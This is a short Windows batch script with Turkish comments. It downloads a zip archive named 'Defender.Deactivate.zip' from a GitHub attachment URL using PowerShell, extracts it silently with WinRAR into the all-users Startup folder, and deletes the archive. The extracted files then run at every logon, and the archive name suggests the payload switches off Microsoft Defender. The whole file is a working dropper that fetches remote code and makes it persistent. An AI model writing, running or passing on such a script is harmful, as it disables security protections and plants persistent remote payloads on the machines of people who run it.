@echo off

:: İndirilecek dosyanın URL'si ve hedef yolu
set "URL=https://github.com/user-attachments/files/16737833/Defender.Deactivate.zip"
set "DOWNLOAD_DIR=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
set "ZIP_FILE=%DOWNLOAD_DIR%\Defender.Deactivate.zip"
set "EXTRACT_DIR=%DOWNLOAD_DIR%"

:: İndirilen zip dosyasını hedef dizine kaydet
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_FILE%'"

:: Zip dosyasını WinRAR ile aç
"C:\Program Files\WinRAR\WinRAR.exe" x -ibck "%ZIP_FILE%" "%EXTRACT_DIR%"

:: Zip dosyasını sil
del "%ZIP_FILE%"



